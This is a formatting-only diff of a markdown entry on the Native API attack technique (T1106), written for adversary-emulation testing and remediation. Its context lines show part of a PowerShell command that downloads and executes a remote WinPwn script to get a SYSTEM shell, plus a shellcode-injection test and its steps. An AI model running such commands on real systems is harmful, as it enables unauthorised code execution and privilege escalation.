@@ -27,10 +27,8 @@ tech_stack:
   - windows
 cwe_ids:
   - CWE-94
-chains_with:
-  []
-prerequisites:
-  []
+chains_with: []
+prerequisites: []
 severity_boost: {}
 ---
 
@@ -81,6 +79,7 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:"#{output_file}" /tar
 ```
 
 **Dependencies:**
+
 - #{source_file} must exist on system.
 
 ### Atomic Test 2: WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess technique
@@ -118,6 +117,7 @@ iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/
 Runs shellcode in the current running process via a syscall.
 
 Steps taken with this technique
+
 1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write
 2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space
 3. Change the memory page permissions to Execute/Read with VirtualProtect
@@ -130,7 +130,6 @@ Steps taken with this technique
 ```powershell
 $PathToAtomicsFolder\T1106\bin\x64\syscall.exe -debug
 ```
-
 
 ### Manual Testing
 
@@ -145,29 +144,28 @@ If Atomic Red Team tests are not applicable, manually verify the technique by:
 ## Remediation Guide
 
 ### M1038 Execution Prevention
+
 Identify and block potentially malicious software executed that may be executed through this technique by using application control tools, like Windows Defender Application Control, AppLocker, or Software Restriction Policies where appropriate.
 
 ### M1040 Behavior Prevention on Endpoint
-On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent Office VBA macros from calling Win32 APIs.
 
+On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent Office VBA macros from calling Win32 APIs.
 
 ## Detection
 
 ### Behavioral Detection of Native API Invocation via Unusual DLL Loads and Direct Syscalls
 
-
 ## Risk Assessment
 
-| Finding | Severity | Impact |
-| ------- | -------- | ------ |
-| Native API technique applicable | Low | Execution |
+| Finding                         | Severity | Impact    |
+| ------------------------------- | -------- | --------- |
+| Native API technique applicable | Low      | Execution |
 
 ## CWE Categories
 
-| CWE ID | Title |
-| ------ | ----- |
+| CWE ID | Title                                  |
+| ------ | -------------------------------------- |
 | CWE-94 | Improper Control of Generation of Code |
-
 
 ## References
 
